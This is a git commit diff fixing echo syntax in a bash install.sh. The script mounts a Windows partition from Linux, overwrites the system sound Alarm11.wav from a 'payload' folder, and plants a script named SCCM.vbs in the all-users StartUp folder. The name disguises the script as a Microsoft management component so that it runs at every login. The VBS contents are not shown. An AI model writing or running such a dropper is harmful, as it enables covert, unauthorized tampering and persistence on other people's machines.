c8d90f218f140bd09b41ec202fa95f7f87371453
felix <felix.coulthard@gmail.com>
2022-06-19 20:33:41 +1000

    fixed echo synax

--- install.sh
+++ install.sh
@@ -1,12 +1,12 @@
 #!/bin/bash
 winpart=`lsblk -l -o NAME,PARTLABEL | sed '/Basic data partition/!d; s/ .*//g'`; \
-echo'Found Windows Partition...'
+echo 'Found Windows Partition...'
 
 mount /dev/$winpart /mnt/Windows; \
-echo'Mounted Windows Partition...'
+echo 'Mounted Windows Partition...'
 cp ./payload/Alarm11.wav /mnt/Windows/Windows/Media/Alarm11.wav; \
-echo'Copied Audio File...'
+echo 'Copied Audio File...'
 cp ./payload/SCCM.vbs /mnt/Windows/ProgramData/Microsoft/Windows/Start\ Menu/Programs/StartUp/SCCM.vbs; \
-echo'Copied VBS Script...'
+echo 'Copied VBS Script...'
 umount /dev/$winpart; \
-echo'Unmounted Windows Partion'
+echo 'Unmounted Windows Partion'
